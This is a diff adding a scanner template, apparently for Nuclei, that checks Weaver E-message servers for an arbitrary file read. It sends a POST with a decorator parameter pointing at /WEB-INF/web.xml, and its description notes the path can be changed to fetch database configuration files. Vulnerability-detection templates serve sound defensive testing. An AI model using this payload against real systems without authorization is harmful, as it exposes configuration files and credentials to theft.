@@ -1,0 +1,35 @@
+id: weaver-e-message-decorator-file-read
+
+info:
+  name: 泛微 E-message  任意文件读取
+  author: SleepingBag945
+  severity: high
+  description: |-
+    decorator参数存在任意文件读取漏洞，可下载系统文件。可更换路径为数据库配置文件等下载
+  reference:
+    - https://github.com/izj007/wechat/blob/daacf42785165d4cd87346add1bab2ef2fe516fd/articles/%5B%E5%A4%A9%E6%BE%9C%E5%AE%9E%E9%AA%8C%E5%AE%A4%5D-2023-11-7-%E6%B3%9B%E5%BE%AE%20E-message%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.md
+
+http:
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
+        Cache-Control: max-age=0
+        Content-Type: application/x-www-form-urlencoded
+        Upgrade-Insecure-Requests: 1
+        Accept-Encoding: gzip, deflate
+
+        decorator=%2FWEB-INF%2Fweb.xml&confirm=true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<session-config>"
+          - "</session-config>"
+        part: body
+        condition: and
